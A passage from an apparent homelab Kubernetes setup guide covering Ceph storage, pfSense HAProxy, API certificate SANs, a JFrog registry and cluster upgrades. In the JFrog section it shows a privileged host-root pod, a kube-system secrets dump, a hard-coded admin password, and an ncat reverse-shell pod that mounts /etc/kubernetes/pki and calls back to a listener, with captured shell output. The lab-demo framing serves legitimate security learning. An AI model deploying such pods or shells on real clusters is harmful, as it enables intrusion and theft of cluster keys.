- cluster-test.yaml: Cluster settings for a test environment such as minikube.

Or we can create cluster-minimal.yaml for example (kubectl create -f cluster-minimal.yaml))
cat cluster-minimal.yaml
apiVersion: ceph.rook.io/v1
kind: CephCluster
metadata:
  name: rook-ceph
  namespace: rook-ceph
spec:
  cephVersion:
    # For the latest ceph images, see https://hub.docker.com/r/ceph/ceph/tags
    image: ceph/ceph:v14.2.1-20190430
  dataDirHostPath: /persist
  mon:
    count: 3
    allowMultiplePerNode: true
  dashboard:
    enabled: true
  storage:
    useAllNodes: true
    useAllDevices: false
    # Important: Directories should only be used in pre-production environments
    directories:
    - path: /persist

$ kubectl get po -n rook-ceph
$ kubectl get cephcluster -n rook-ceph
NAME        DATADIRHOSTPATH   MONCOUNT   AGE     STATE     HEALTH
rook-ceph   /persist          3          3m27s   Created   HEALTH_

Install ceph-toolbox: https://rook.github.io/docs/rook/latest/Troubleshooting/ceph-toolbox/ and check ceph cluster

Setup k8s storageclass
cat storageclass.yaml:
apiVersion: ceph.rook.io/v1
kind: CephBlockPool
metadata:
  name: testpool
  namespace: rook-ceph
spec:
  failureDomain: host
  replicated:
    size: 1
---
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
   name: rook-ceph-block
provisioner: ceph.rook.io/block
parameters:
  blockPool: testpool
  # The value of "clusterNamespace" MUST be the same as the one in which your rook cluster exist
  clusterNamespace: rook-ceph
  # Specify the filesystem type of the volume. If not specified, it will use `ext4`.
  fstype: ext4
# Optional, default reclaimPolicy is "Delete". Other options are: "Retain", "Recycle" as documented in https://kubernetes.io/docs/concepts/storage/storage-classes/
reclaimPolicy: Delete

$ kubectl create -f storageclass.yaml

$ kubectl get storageclass
NAME              PROVISIONER          AGE
rook-ceph-block   ceph.rook.io/block   5m42s

	 
```

#### K8s logging (EFK) : OPTIONAL

NOTE: CSI (Ceph) has to be installed (if not: pending pods)

```
% cd K8S/system-chatrs/efk
% kubectl patch storageclass ceph -p '{"metadata": {"annotations":{"storageclass.kubernetes.io/is-default-class":"true"}}}'
% kubectl get storageclass 
% helm dependency update .    
% helm install efk . --render-subchart-notes -n efk --create-namespace
```

#### Check k8s cluster (after all k8s add-ons installation: k8s manual install example: CNI Calico)

```
### Helm charts check
% helm list --all-namespaces
NAME          	NAMESPACE    	REVISION	UPDATED                             	STATUS  	CHART                 	APP VERSION
calico        	default      	1       	2022-03-04 11:28:13.44394 +0200 EET 	deployed	calico-tigera-0.1.0   	v3.22      
ceph          	ceph-rbd     	1       	2022-03-04 12:46:25.905455 +0200 EET	deployed	ceph-rbd-0.1.0        	v3.3.1     
metrics-server	kube-system  	1       	2022-03-04 13:43:37.35686 +0200 EET 	deployed	kube-system-3.8.2     	0.6.1      
nginx         	ingress-nginx	1       	2022-03-04 12:55:22.147263 +0200 EET	deployed	nginx-controller-0.1.0	1.1.1      
prometheus    	prometheus   	1       	2022-03-04 15:02:23.346408 +0200 EET	deployed	prometheus-0.1.0  

### Pods check
% kubectl get po --all-namespaces                                                       
NAMESPACE          NAME                                                     READY   STATUS    RESTARTS        AGE
calico-apiserver   calico-apiserver-75ddc9874-tf4bp                         1/1     Running   0               3h49m
calico-system      calico-kube-controllers-67f85d7449-j425m                 1/1     Running   0               3h50m
calico-system      calico-node-7k6kh                                        1/1     Running   0               3h50m
calico-system      calico-node-lbw5k                                        1/1     Running   0               3h50m
calico-system      calico-node-pr9hs                                        1/1     Running   0               3h50m
calico-system      calico-typha-645f6dc575-fwllh                            1/1     Running   0               3h50m
calico-system      calico-typha-645f6dc575-pnm8k                            1/1     Running   0               3h50m
ceph-rbd           ceph-ceph-csi-rbd-nodeplugin-6n6cd                       3/3     Running   0               152m
ceph-rbd           ceph-ceph-csi-rbd-nodeplugin-hfpd6                       3/3     Running   0               152m
ceph-rbd           ceph-ceph-csi-rbd-provisioner-7d9868946f-h8mgw           7/7     Running   0               152m
ceph-rbd           ceph-ceph-csi-rbd-provisioner-7d9868946f-vpbk4           0/7     Pending   0               152m
ceph-rbd           ceph-ceph-csi-rbd-provisioner-7d9868946f-ws4gq           7/7     Running   0               152m
ingress-nginx      nginx-ingress-nginx-controller-f4fdf5f6b-hnlq8           1/1     Running   0               143m
ingress-nginx      nginx-ingress-nginx-controller-f4fdf5f6b-t5vbl           1/1     Running   0               143m
kube-system        coredns-64897985d-rx2mc                                  1/1     Running   0               4h55m
kube-system        coredns-64897985d-zqt8v                                  1/1     Running   0               4h55m
kube-system        etcd-kmaster0                                            1/1     Running   1 (4h27m ago)   4h55m
kube-system        kube-apiserver-kmaster0                                  1/1     Running   1 (4h27m ago)   4h55m
kube-system        kube-controller-manager-kmaster0                         1/1     Running   1 (4h27m ago)   4h55m
kube-system        kube-proxy-7k8tc                                         1/1     Running   1 (4h27m ago)   4h50m
kube-system        kube-proxy-8kxfm                                         1/1     Running   1 (4h27m ago)   4h55m
kube-system        kube-proxy-hjfpt                                         1/1     Running   1 (4h27m ago)   4h49m
kube-system        kube-scheduler-kmaster0                                  1/1     Running   1 (4h27m ago)   4h55m
kube-system        metrics-server-7d76b744cd-ds5sw                          1/1     Running   0               95m
prometheus         alertmanager-prometheus-kube-prometheus-alertmanager-0   2/2     Running   0               16m
prometheus         prometheus-grafana-8568977b76-znwzl                      3/3     Running   0               16m
prometheus         prometheus-kube-prometheus-operator-f786bd989-2v85x      1/1     Running   0               16m
prometheus         prometheus-kube-state-metrics-94f76f559-vwcl9            1/1     Running   0               16m
prometheus         prometheus-prometheus-kube-prometheus-prometheus-0       2/2     Running   0               16m
prometheus         prometheus-prometheus-node-exporter-2ztpv                1/1     Running   0               16m
prometheus         prometheus-prometheus-node-exporter-76xxc                1/1     Running   0               16m
prometheus         prometheus-prometheus-node-exporter-ql5sd                1/1     Running   0               16m
tigera-operator    tigera-operator-747d647775-754hx                         1/1     Running   0               3h50m

### StorageClass
% kubectl get sc
NAME   PROVISIONER        RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE
ceph   rbd.csi.ceph.com   Delete          Immediate           true                   3h7m

### ETC.
```

### 2.10.pfSense HAProxy setup for k8s API external access and k8s NodePort Services/(Ingress?) access (frontend/backend: load-balancing 3 k8s API servers for example)

<img src="pictures/pfSense-HAProxy-backend.png?raw=true" width="800">

<img src="pictures/pfSense-HAProxy-frontend.png?raw=true" width="800">

```
$ cp admin.conf admin-haproxy.conf 
$ vi admin-haproxy.conf 
$ export KUBECONFIG=./admin-haproxy.conf 
$ kubectl get node
Unable to connect to the server: x509: cannot validate certificate for 192.168.1.14 because it doesn't contain any IP SANs
$ kubectl get node
Unable to connect to the server: x509: certificate is valid for 172.21.0.1, 10.0.200.18, 127.0.0.1, not 192.168.1.14
$ kubectl get node  --insecure-skip-tls-verify 
NAME       STATUS   ROLES                  AGE   VERSION
kmaster0   Ready    control-plane,master   16h   v1.23.4
kworker0   Ready    <none>                 16h   v1.23.4
kworker1   Ready    <none>                 16h   v1.23.4

Note: You can do it by adding insecure-skip-tls-verify: true to kubeconfig file so it look something like this:
- cluster:
    insecure-skip-tls-verify: true
    server: https://<master_ip>:<port>

Note: We can delete static route on laptop now and we can access k8s API/NodePort services via HAProxy load-balancer. Also we need to add k8s certs for pfSense HAProxy LB IP: 10.0.200.14 (pfSense WAN interface, but can be pfSense VirtualIP maped to HAProxy LB frontend)  -> Ref: ansible-kubernetes/variables.yaml. Also we can use openvpn client and setup pfSense OpenVpn for for access internal networks/VALNs: 10.0.200.0/24 (pfSense OpenVPN: push "route 10.0.200.0 255.255.255.0"; or we can setup pfSense IPSec tunnels for homelab external access) 

Note: For API server to work with HAProxy LB IP without using  --insecure-skip-tls-verify (pfSense WAN interface in this setup, or pfSense VirtualIP-map-HAProxy) we can use  -> Adding a Name to the Kubernetes API Server Certificate -> https://blog.scottlowe.org/2019/07/30/adding-a-name-to-kubernetes-api-server-certificate/ & https://devops.stackexchange.com/questions/9483/how-can-i-add-an-additional-ip-hostname-to-my-kubernetes-certificate

$ kubectl -n kube-system get configmap kubeadm-config -o jsonpath='{.data.ClusterConfiguration}' > kubeadm.yaml
$ cat kubeadm.yaml 
apiServer:
  certSANs:
  - 10.0.200.18
  - localhost
  - 127.0.0.1
  extraArgs:
    authorization-mode: Node,RBAC
  timeoutForControlPlane: 4m0s
apiVersion: kubeadm.k8s.io/v1beta3
certificatesDir: /etc/kubernetes/pki
clusterName: kubernetes
controllerManager: {}
dns: {}
etcd:
  local:
    dataDir: /var/lib/etcd
imageRepository: k8s.gcr.io
kind: ClusterConfiguration
kubernetesVersion: v1.23.8
networking:
  dnsDomain: cluster.local
  podSubnet: 172.20.0.0/16
  serviceSubnet: 172.21.0.0/16
scheduler: {}

Now open the file in an editor, and find the certSANs list under the apiServer section. You’ll need to add pfSense HAProxy frontend IP (192.168.1.14 = pfSense WAN in this homelab setup); if so, you’ll just add another entry to that list. Example:

$ cat kubeadm.yaml 
apiServer:
  certSANs:
  - 10.0.200.18
  - 192.168.1.14
  - localhost
  - 127.0.0.1
  extraArgs:
    authorization-mode: Node,RBAC
  timeoutForControlPlane: 4m0s
apiVersion: kubeadm.k8s.io/v1beta3
certificatesDir: /etc/kubernetes/pki
clusterName: kubernetes
controllerManager: {}
dns: {}
etcd:
  local:
    dataDir: /var/lib/etcd
imageRepository: k8s.gcr.io
kind: ClusterConfiguration
kubernetesVersion: v1.23.8
networking:
  dnsDomain: cluster.local
  podSubnet: 172.20.0.0/16
  serviceSubnet: 172.21.0.0/16
scheduler: {}

Now move the old certificates to another folder, otherwise kubeadm will not recreate new ones:

mv /etc/kubernetes/pki/apiserver.{crt,key} ~

Use kubeadm to generate new apiserver certificates:

kubeadm init phase certs apiserver --config kubeadm.yaml

Now restart your kubeapiserver container:

If your nodes are running containerd as the container runtime, the commands are a bit different:

Run crictl pods | grep kube-apiserver | cut -d' ' -f1 to get the Pod ID for the Kubernetes API server Pod.
Run crictl stopp <pod-id> to stop the Pod.
Run crictl rmp <pod-id> to remove the Pod.

The Kubelet will automatically restart the container, which will pick up the new certificate. As soon as the API server restarts, you will immediately be able to connect to it using one of the newly-added IP addresses or hostnames. One quick update: on Kubernetes v1.22.3 I did not have to restart the apiserver for the new certs to be used.

If everything is working as expected, don't forget to update the kubeadm ConfigMap stored in the cluster, otherwise, future kubeadm upgrade will be lacking your new config:

If using Kubernetes < v1.15:

kubeadm config upload from-file --config kubeadm.yaml

For Kubernetes version >= v1.15:

kubeadm init phase upload-config kubeadm --config kubeadm.yaml

Verify: openssl x509 -in /etc/kubernetes/pki/apiserver.crt -text && kubectl -n kube-system get configmap kubeadm-config -o yaml

This howto has a more complete guide on how to "Adding a Name to the Kubernetes API Server Certificate" https://blog.scottlowe.org/2019/07/30/adding-a-name-to-kubernetes-api-server-certificate/

```

Note: k8s Services (NodePort)  -> Create HAProxy frontend/backend (WAN interface or pfSense Virtual IP <---map---> frontend, backend <---map---> server1/2/3...n/:NodPort). pfSense HAProxy nginx example bellow (Service: NodePort)


```
$ kubectl create deployment nginx --image=nginx --replicas=2
deployment.apps/nginx created

$ kubectl create service nodeport nginx --tcp=80:80
service/nginx created
$ kubectl get svc
NAME         TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE
kubernetes   ClusterIP   172.21.0.1       <none>        443/TCP        5d23h
nginx        NodePort    172.21.131.214   <none>        80:31893/TCP   6s

$ curl 10.0.200.19:31893
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>

$ curl 10.0.200.20:31893
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>

$ curl 10.0.200.18:31893
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```

HA HAProxy LB --->  frontend 192.168.1.14:8888 ---> backends worker1/2:31893 and add firewall rule (WAN: port 8888 from any)

pfSense WAN = 192.168.1.14

```
$ curl 192.168.1.14:8888
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>


```

<img src="pictures/pfSense-haproxy-nginx-nodeport-backend.png?raw=true" width="800">
<img src="pictures/pfSense-haproxy-nginx-nodeport-frontend.png?raw=true" width="800">
<img src="pictures/pfSense-haproxy-nginx-nodeport-firewall-rule-WAN.png?raw=true" width="800">



### 2.11.JFROG Docker Registry: clone ubuntu-base and name VM it jfrog. Start jfrog VM. Install/Setup jfrog. Push some docker image to Jfrog Docker Registry. k8s Pod: container from Jfrog Docker Registry. 

Note: We can use pfSense DNS rewrite for registry.davar.com for example, to use DNS name instead of Registry IP.

```
$ scp jfrog-artifactory-jcr-7.38.8.deb root@10.0.200.8:/
$ ssh devops@10.0.200.8
root@ubuntu-base:/# sudo dpkg -i ./jfrog-artifactory-jcr-7.38.8.deb 
root@ubuntu-base:/# sudo systemctl start artifactory.service
root@ubuntu-base:/# systemctl status artifactory.service

Setup jfrog: http://10.0.200.8:8082/ui/

Change admin/password -> admin/Parah0d!

### Check Jfrog Docker Registry (from laptop and k8s nodes)
davar@carbon:~/Documents/$ nc -z -v  10.0.200.8  8082
Connection to 10.0.200.8 8082 port [tcp/*] succeeded!
root@kworker1:/etc/containerd# nc -z -v  10.0.200.8  8082
Connection to 10.0.200.8 8082 port [tcp/*] succeeded!

### Laptop setup (docker to build/push some image to jfrog docker registry) 
root@carbon:/etc/docker# cat daemon.json
{
    "insecure-registries" : ["10.0.200.8:8082"]
}
root@carbon:/etc/docker# 
root@carbon:/etc/docker# systemctl restart docker

root@carbon:/etc/docker# docker login https://10.0.200.8:8082
Username: admin
Password: Parah0d!
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded

### create docker repo in jfrog via jfrog UI (alpine-containertools)

$ cd DevSecOps-K8S/alpine-containertools
$ docker build -t 10.0.200.8:8082/alpine-containertools/alpine-containertools .

$ docker push 10.0.200.8:8082/alpine-containertools/alpine-containertools 
...
The push refers to repository [10.0.200.8:8082/alpine-containertools/alpine-containertools]
latest: digest: sha256:0b2ad7e2471ab4f6aad0921a4641aa0171626237a896063cc399601d5f6d792d size: 6408

### Update containerd (all k8s nodes):
root@kmaster0:/etc/containerd# grep "10.0" config.toml 
        [plugins."io.containerd.grpc.v1.cri".registry.mirrors."10.0.200.8:8082"]
          endpoint = ["http://10.0.200.8:8082"]
root@kmaster0:/etc/containerd# systemctl restart containerd


### Create k8s secret for Jfrog Docker Registry
kubectl create secret docker-registry regcred --docker-server=10.0.200.8:8082 --docker-username=admin --docker-password=Parah0d! --docker-email=rman@mail.bg -n default

Ref:https://jfrog.com/blog/pulling-all-your-kubernetes-cluster-images-from-a-private-artifactory-registry/

### Deploy 
$ cd DevSecOps-K8S/alpine-containertools/manifests
$ cat privpod.yml 
#Simple example of a privileged pod
apiVersion: v1
kind: Pod
metadata:
  name: privpod
  labels:
spec:
  containers:
  - name: privpod
    image: 10.0.200.8:8082/alpine-containertools/alpine-containertools
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /node
      name: noderoot
  imagePullSecrets:
  - name: regcred
  volumes:
  - name: noderoot
    hostPath:
      path: /

### Note: imagePullSecrets
$ kubectl apply -f ./privpod.yml


$ kubectl get po
NAME      READY   STATUS    RESTARTS   AGE
privpod   1/1     Running   0          18s
$ kubectl exec -it privpod -- bash
bash-5.1# ps -ef
PID   USER     TIME  COMMAND
    1 root      0:00 sshd: /usr/sbin/sshd -D -p 3456 -e [listener] 0 of 10-100 startups
   21 root      0:00 bash
   27 root      0:00 ps -ef
bash-5.1# ls /
bin            dev            etc            lib            media          node           proc           run            scripts        sys            usr
charts         entrypoint.sh  home           manifests      mnt            opt            root           sbin           srv            tmp            var
bash-5.1# ls /proc
1                  bus                devices            fb                 irq                kpagecgroup        meminfo            pagetypeinfo       self               sysrq-trigger      version
49                 cgroups            diskstats          filesystems        kallsyms           kpagecount         misc               partitions         slabinfo           sysvipc            version_signature
60                 cmdline            dma                fs                 kcore              kpageflags         modules            pressure           softirqs           thread-self        vmallocinfo
acpi               consoles           driver             interrupts         key-users          loadavg            mounts             sched_debug        stat               timer_list         vmstat
bootconfig         cpuinfo            dynamic_debug      iomem              keys               locks              mtrr               schedstat          swaps              tty                zoneinfo
buddyinfo          crypto             execdomains        ioports            kmsg               mdstat             net                scsi               sys                uptime
bash-5.1# 

OR we can use :

$ kubectl run -i -t devsecops --rm --image=10.0.200.8:8082/alpine-containertools/alpine-containertools --image-pull-policy="IfNotPresent" --overrides='{ "spec": { "template": { "spec": { "imagePullSecrets": [{"name": "regcred"}] } } } }' /bin/bash
If you don't see a command prompt, try pressing enter.
bash-5.1# kubectl -n kube-system get secrets -o yaml


### Example reverse shell pod

### create docker repo in jfrog via jfrog UI (ncat)
$ cd DevSecOps-K8S/ncat

$ docker build -t 10.0.200.8:8082/ncat/ncat .
$ docker push  10.0.200.8:8082/ncat/ncat

Target Cluster

So we just need a Pod manifest that will open a reverse shell on your pentester machine when created. The example below will create that kind of pod and additionally will mount the hosts root filesystem into /host, although this will fail if a restrictive PodSecurityPolicy is in place.

$ cd K8S/k8s-playground/devsecops-playgrond/alpine-containertools/manifests
$ cat ncat-reverse-shell-pod-static.yml 
# This pod creates a reverse shell back to an external hosts (edit the [IP] to set)
# It'll also mount the /etc/kubernetes/pki directory into the conatiner as a demo.
apiVersion: v1
kind: Pod
metadata:
  name: ncat-reverse-shell-pod
spec:
  containers:
  - name: ncat-reverse-shell
    image: 10.0.200.8:8082/ncat/ncat
    volumeMounts:
    - mountPath: /pki
      name: keyvolume
    args: ['192.168.1.100', '8989', '-e', '/bin/bash']
  imagePullSecrets:
  - name: regcred
  volumes:
  - name: keyvolume
    hostPath:
      path: /etc/kubernetes/pki
      type: Directory

$ kubectl apply -f ./ncat-reverse-shell-pod-static.yml

Pentester Machine (home laptop) - 192.168.1.100  we just need to start a listener to wait for our shell to come in. The command below will open a shell on port 8989/TCP to wait for a connection

ncap -l -p 8989

davar@carbon:~$ ncat -l -p 8989
ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 09:41 ?        00:00:00 /usr/local/bin/ncat 192.168.1.100 8989 -e /bin/bash
root          11       1  0 09:41 ?        00:00:00 /bin/bash
root          12      11  0 09:41 ?        00:00:00 ps -ef
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

$ kubectl get po
NAME                     READY   STATUS    RESTARTS     AGE
ncat-reverse-shell-pod   1/1     Running   1 (6s ago)   12s
privpod                  1/1     Running   0            41h


``` 
<img src="pictures/PROXMOX-jfrog-VM-summary.png?raw=true" width="800">
<img src="pictures/PROXMOX-jfrog-VM-hardware.png?raw=true" width="800">
<img src="pictures/jfrog-repo-example.png?raw=true" width="800">
  
  
Note: JFrog behind pfSense HAProxy LB (no access to VLAN 200 = no static route) 

<img src="pictures/pfSense-HAProxy-JFrog-backend.png?raw=true" width="800">
<img src="pictures/pfSense-HAProxy-JFrog-fontend.png?raw=true" width="800">
<img src="pictures/pfSense-WAN-Firewall-rules-JFrog.png?raw=true" width="800">

```
$ nc -z -v  192.168.1.14  8082
Connection to 192.168.1.14 8082 port [tcp/*] succeeded!

root@carbon:/etc/docker# cat daemon.json
{
    "insecure-registries" : ["192.168.1.14:8082"]
}

root@carbon:/etc/docker# systemctl restart docker

root@carbon:/etc/docker# docker login https://10.0.200.8:8082

$ cd DevSecOps-K8S/alpine-containertools
$ docker build -t 192.168.1.14:8082/alpine-containertools/alpine-containertools .
$ docker push 192.168.1.14:8082/alpine-containertools/alpine-containertools 
etc.
```  

## Clean Proxmox k8s environment:
```
% terraform destroy
...
Destroy complete! Resources: 4 destroyed.
```

### TODO: GitLab CI Pipeline create (.gitlab-ci.yml)
Ref: https://github.com/adavarski/docker-ansible-gitlab-private && https://github.com/adavarski/devops-server-docker-ansible for ansible, also configure docker-based GitLab runner/s, and use GitLab-based shared terraform state (setup "gitlab.rb" for terraform and reconfigure GitLab CI) : https://github.com/adavarski/devops-server-gitlab-install & https://github.com/adavarski/devops-server-gitlab-runner-install
Example GitLab pipeline with terraform and ansible: https://github.com/adavarski/devops-server-postgres-ha-prod/blob/main/.gitlab-ci.yml

### TODO: Upgrade k8s 1.23 -> 1.24 

Ref: https://kubernetes.io/blog/2022/05/03/kubernetes-1-24-release-announcement/

For example, the following container runtimes are being prepared, or have already been prepared, for Kubernetes:

containerd v1.6.4 and later, v1.5.11 and later
CRI-O 1.24 and later

Service issues exist for pod CNI network setup and tear down in containerd v1.6.0–v1.6.3 when the CNI plugins have not been upgraded and/or the CNI config version is not declared in the CNI config files. The containerd team reports, "these issues are resolved in containerd v1.6.4."

With containerd v1.6.0–v1.6.3, if you do not upgrade the CNI plugins and/or declare the CNI config version, you might encounter the following "Incompatible CNI versions" or "Failed to destroy network for sandbox" error conditions.

Note: for fresh install we need new ansible roles for base-image/k8s-node templates (Ubuntu 21.10, containerd:1.6.4, kubeadm/kubectl/kubelet:1.24)

Example: manual upgrade (Note: we need ansible roles for this to be automated):
```
### Upgrading Control Plane Nodes

$ ssh kube-master
$ sudo apt update
...
$ sudo apt-cache madison kubeadm
$ sudo apt-mark unhold kubeadm && sudo apt-get update && sudo
apt-get install \
-y kubeadm=1.19.0-00 && sudo apt-mark hold kubeadm
Canceled hold on kubeadm.
...

$ sudo apt-get update && sudo apt-get install -y --allow-change-
held-packages \
kubeadm=1.19.0-00
...

$ kubeadm version

$ sudo kubeadm upgrade plan
...
[upgrade] Fetching available versions to upgrade to
[upgrade/versions] Cluster version: v1.18.20
[upgrade/versions] kubeadm version: v1.19.0
I0708 17:32:53.037895
17430 version.go:252] remote version is
much newer: \
v1.21.2; falling back to: stable-1.19
[upgrade/versions] Latest stable version: v1.19.12
[upgrade/versions] Latest version in the v1.18 series: v1.18.20
...
You can now apply the upgrade by executing the following command:
kubeadm upgrade apply v1.19.12
Note: Before you can perform this upgrade, you have to update
kubeadm to v1.19.12.
...

As described in the console output, we’ll start the upgrade for the control
plane. The process may take a couple of minutes. You may have to upgradethe CNI plugin as well. Follow the provider instructions for more
information.

$ sudo kubeadm upgrade apply v1.19.0
...
[upgrade/version] You have chosen to change the cluster version
to "v1.19.0"
[upgrade/versions] Cluster version: v1.18.20
[upgrade/versions] kubeadm version: v1.19.0
...
[upgrade/successful] SUCCESS! Your cluster was upgraded to
"v1.19.0". Enjoy!
[upgrade/kubelet] Now that your control plane is upgraded, please
proceed \
with upgrading your kubelets if you haven't already done so.


Drain the master node by evicting workload. New workload won’t be
schedulable on the node until uncordoned.
$ kubectl drain kube-master --ignore-daemonsets
node/kube-master cordoned
WARNING: ignoring DaemonSet-managed Pods: kube-system/calico-
node-qndb9, \
kube-system/kube-proxy-vpvms
evicting pod kube-system/calico-kube-controllers-65f8bc95db-krp72
evicting pod kube-system/coredns-f9fd979d6-2brkq
pod/calico-kube-controllers-65f8bc95db-krp72 evicted
pod/coredns-f9fd979d6-2brkq evicted
node/kube-master evicted


Upgrade the kubelet and the kubectl tool to the same version.
$ sudo apt-mark unhold kubelet kubectl && sudo apt-get update &&
sudo \
apt-get install -y kubelet=1.19.0-00 kubectl=1.19.0-00 && sudo
apt-mark \
hold kubelet kubectl
...

Restart the kubelet process.
$ sudo systemctl daemon-reload
$ sudo systemctl restart kubelet
Reenable the control plane node back so that new workload can become
schedulable.
$ kubectl uncordon kube-master
node/kube-master uncordoned

The master nodes should now show the usage of Kubernetes 1.19.0.
$ kubectl get nodes


### Upgrading Worker Nodes
$ ssh kube-worker-1

$ sudo apt-mark unhold kubeadm && sudo apt-get update && sudo
apt-get install \
-y kubeadm=1.19.0-00 && sudo apt-mark hold kubeadm
Canceled hold on kubeadm.
...

Upgrade the kubelet configuration.
$ sudo kubeadm upgrade node
[upgrade] Reading configuration from the cluster...
[upgrade] FYI: You can look at this config file with 'kubectl -n
kube-system \
get cm kubeadm-config -oyaml'
[preflight] Running pre-flight checks
[preflight] Skipping prepull. Not a control plane node.
[upgrade] Skipping phase. Not a control plane node.
[kubelet-start] Writing kubelet configuration to file \
"/var/lib/kubelet/config.yaml"
[upgrade] The configuration for this node was successfully
updated!
[upgrade] Now you should go ahead and upgrade the kubelet package
using your \
package manager.
Drain the worker node by evicting workload. New workload won’t be
schedulable on the node until uncordoned.
$ kubectl drain kube-worker-1 --ignore-daemonsets
node/kube-worker-1 cordoned
WARNING: ignoring DaemonSet-managed Pods: kube-system/calico-
node-2hrxg, \
kube-system/kube-proxy-qf6nl
evicting pod kube-system/calico-kube-controllers-65f8bc95db-kggbr
evicting pod kube-system/coredns-f9fd979d6-7zm4q

evicting pod kube-system/coredns-f9fd979d6-tlmhq
pod/calico-kube-controllers-65f8bc95db-kggbr evicted
pod/coredns-f9fd979d6-7zm4q evicted
pod/coredns-f9fd979d6-tlmhq evicted
node/kube-worker-1 evicted
Upgrade the kubelet and the kubectl tool with the same command used
for the control plane node.
$ sudo apt-mark unhold kubelet kubectl && sudo apt-get update &&
sudo apt-get \
install -y kubelet=1.19.0-00 kubectl=1.19.0-00 && sudo apt-mark
hold kubelet \
kubectl
...

Restart the kubelet process.
$ sudo systemctl daemon-reload
$ sudo systemctl restart kubelet
Reenable the worker node so that new workload can become schedulable.
$ kubectl uncordon kube-worker-1
node/kube-worker-1 uncordoned
Listing the nodes should now show version 1.19.0 for the worker node. You
won’t be able to run the kubectl get nodes from the worker node
without copying the administrator kubeconfig file from the master node.
Follow the instructions in the Kubernetes documentation to do so or log
back into the master node.
$ kubectl get nodes


### Backing up and Restoring etcd

$ ssh kube-master
$ etcdctl version
$ kubectl get pods -n kube-system
$ kubectl describe pod etcd-kube-master -n kube-system
$ sudo ETCDCTL_API=3 etcdctl --
cacert=/etc/kubernetes/pki/etcd/ca.crt \
--cert=/etc/kubernetes/pki/etcd/server.crt \
--key=/etc/kubernetes/pki/etcd/server.key \
snapshot save /opt/etcd-backup.db

Restoring etcd

$ sudo ETCDCTL_API=3 etcdctl --data-dir=/var/lib/from-backup
snapshot restore \
/opt/etcd-backup.db

Edit the YAML manifest of the etcd Pod which can be found at
/etc/kubernetes/manifests/etcd.yaml. Change the value of
the attribute spec.volumes.hostPath with the name etcd-data
from the original value /var/lib/etcd to /var/lib/from-
backup.
$ cd /etc/kubernetes/manifests/
$ sudo vim etcd.yaml

spec:
volumes:
...
- hostPath:
path: /var/lib/from-backup
type: DirectoryOrCreate
name: etcd-data
...
The etcd-kube-master Pod will be recreated and points to the restored
backup directory.
$ kubectl get pod etcd-kube-master -n kube-system

In case the Pod doesn’t transition into the “Running” status, try to delete it
manually with the command kubectl delete pod etcd-kube-
master -n kube-system.
Exit out of the node using the exit command.
```
### TODO: Extend the Kubernetes clusters with N additional nodes (for more workloads)

Example: manual add k8s nodes (Note: we need ansible roles/terraform modules for this to be automated):
